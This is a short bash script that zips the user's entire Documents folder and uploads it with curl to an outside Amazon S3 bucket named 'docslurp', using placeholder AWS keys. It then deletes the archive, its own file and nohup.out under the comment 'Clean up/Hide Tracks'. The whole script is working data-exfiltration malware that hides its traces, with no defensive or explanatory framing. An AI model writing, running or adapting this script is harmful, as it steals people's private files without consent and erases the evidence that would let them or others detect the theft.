#!/bin/bash
zip -r docs.zip ~/Documents
file="docs.zip"
key_id="YOUR_AWS_KEY"
key_secret="YOUR_AWS_SECRET_KEY"
path="data/$file"
bucket="docslurp"
content_type="application/octet-stream"
date="$(LC_ALL=C date -u +"%a, %d %b %Y %X %z")"
md5="$(openssl md5 -binary < "$file" | base64)"

sig="$(printf "PUT\n$md5\n$content_type\n$date\n/$bucket/$path" | openssl sha1 -binary -hmac "$key_secret" | base64)"

curl -T $file http://$bucket.s3.amazonaws.com/$path \
    -H "Date: $date" \
    -H "Authorization: AWS $key_id:$sig" \
    -H "Content-Type: $content_type" \
    -H "Content-MD5: $md5"

# Clean up/Hide Tracks
rm -Rf docs.zip
rm -Rf uploader.sh
rm -Rf nohup.out